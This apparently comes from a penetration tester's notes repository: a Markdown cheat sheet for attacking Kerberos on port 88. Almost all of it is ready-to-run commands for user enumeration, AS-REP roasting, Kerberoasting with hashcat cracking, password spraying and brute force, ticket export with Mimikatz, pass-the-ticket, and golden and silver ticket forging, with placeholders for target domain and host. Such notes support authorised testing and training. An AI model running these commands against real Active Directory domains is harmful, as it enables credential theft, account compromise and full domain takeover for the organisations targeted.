# Port 88 - Kerberos

## Table of Contents

- [Enumeration](#enumeration)
  - [Nmap Scripts](#nmap-scripts)
  - [User Enumeration](#user-enumeration)
- [Attacks](#attacks)
  - [AS-REP Roasting](#as-rep-roasting)
  - [Kerberoasting](#kerberoasting)
  - [Password Spraying](#password-spraying)
- [Tools](#tools)

---

## Enumeration

### Quick Check (One-liner)

```shell
# Nmap Kerberos enum
nmap -p 88 --script "krb5-enum-users" --script-args krb5-enum-users.realm=$domain,userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt $rhost
```

### User Enumeration (One-liner)

```shell
# Kerbrute (fastest)
kerbrute userenum -d $domain --dc $rhost /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100 | tee kerb_users.txt
```

---

## Attacks (One-liner)

> **📚 For complete methodology, see [Kerberos Attacks](../../3.AD-Exploit/3.3.Kerberos-Attacks.md)**

### AS-REP Roasting (One-liner)

```shell
# Get AS-REP hash + crack
impacket-GetNPUsers $domain/ -dc-ip $rhost -usersfile users.txt -format hashcat -outputfile asrep.txt && hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting (One-liner)

```shell
# Get TGS + crack
impacket-GetUserSPNs $domain/$user:$password -dc-ip $rhost -request -outputfile tgs.txt && hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

### Password Spraying

```shell
# Kerbrute
kerbrute passwordspray -d $domain --dc $rhost users.txt 'Password123!'

# NetExec
nxc smb $rhost -u users.txt -p 'Password123!' --continue-on-success
```

---

## Tools

### Kerbrute

```shell
# User enumeration
kerbrute userenum -d $domain --dc $rhost users.txt

# Password spray
kerbrute passwordspray -d $domain --dc $rhost users.txt 'Password123!'

# Brute force
kerbrute bruteuser -d $domain --dc $rhost passwords.txt username
```

### Impacket

```shell
# Get TGT
impacket-getTGT $domain/$user:$password -dc-ip $rhost

# Get ST (Service Ticket)
impacket-getST $domain/$user:$password -spn cifs/$rhost -dc-ip $rhost

# Use ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass $domain/$user@$rhost
```

### Rubeus (Windows)

```shell
# AS-REP Roast
.\Rubeus.exe asreproast /format:hashcat

# Kerberoast
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Request TGT
.\Rubeus.exe asktgt /user:$user /password:$password /domain:$domain

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## Ticket Manipulation

> **📚 For complete Golden/Silver Ticket theory and advanced usage, see [Kerberos Attacks](../../3.AD-Exploit/3.3.Kerberos-Attacks.md#golden-ticket)**

### Pass-the-Ticket

```shell
# Export tickets (Mimikatz)
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# Verify
klist
```

### Golden Ticket

```shell
# Requires krbtgt NTLM hash
kerberos::golden /user:Administrator /domain:$domain /sid:$domain_sid /krbtgt:$krbtgt_hash /ptt
```

### Silver Ticket

```shell
# Requires service account NTLM hash
kerberos::golden /user:Administrator /domain:$domain /sid:$domain_sid /target:$rhost /service:cifs /rc4:$service_hash /ptt
```
---

## See Also

- **[Kerberos Attacks](../../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Kerberoasting, ASREPRoast, Golden/Silver Tickets
- **[AD Exploitation](../../3.AD-Exploit/3.1.AD-Exploitation.md)** - Full AD attack methodology
- **[Kerberos Delegation](../../3.AD-Exploit/3.7.Kerberos-Delegation.md)** - Unconstrained/Constrained delegation attacks
- **[Lateral Movement](../../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Pass-the-Ticket, Overpass-the-Hash
- **[LDAP](389-636-3268-3269-ldap.md)** - AD enumeration via LDAP